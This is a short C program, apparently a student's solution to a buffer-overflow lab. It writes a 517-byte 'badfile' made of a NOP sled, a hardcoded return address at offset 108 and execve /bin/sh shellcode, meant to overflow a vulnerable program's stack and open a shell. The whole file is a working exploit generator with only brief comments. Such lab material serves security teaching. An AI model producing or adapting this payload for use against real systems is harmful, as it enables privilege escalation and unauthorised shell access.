#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	// initializing the buffer size and badfile
    char buffer[517];
    FILE *badfile;

	// putting 517 NOP instructions into the buffer
    memset(&buffer, 0x90, 517);

	// this is the ret addr - the addr of the buffer = 108
	// 218 is into the return addr to overflow the buffer
*((long *)(buffer+108))=0xbff5c400;

	// this is loading shellcode into the buffer
memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

	// ensuring badfile is not empty
    badfile = fopen("./badfile", "w");
	// writing the above into badfile
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);

	return 0;
}
